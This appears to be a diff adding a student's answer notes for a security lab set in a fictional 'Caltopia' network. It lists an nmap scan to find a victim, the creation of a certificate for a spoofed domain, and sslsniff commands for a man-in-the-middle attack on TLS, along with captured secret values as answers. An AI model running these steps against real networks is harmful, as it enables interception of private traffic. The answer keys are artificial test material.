@@ -1,0 +1,20 @@
+Q1.
+----Attack:
+ifconfig
+nmap 10.161.161.161/24
+get the victim's IP address 10.161.161.111
+secret:
+d0b1e7032597c6f9
+
+Q2.
+a) 2dd10c16f7ef3861
+b)
+
+Q3. data.gov-of-caltopia.info/abc.neocal.info
+openssl req -nodes -newkey rsa:1024 -keyout data0.priv -out data0.req
+Copy the content of data0.req into https://budget-certs-r-us.biz/ to generate certificate. Copy certificate into file data0.x509
+./sslsniff_install_cert data0.x509 data0.priv 
+./sslsniff
+
+secret=ef2c24b4288b7245
+
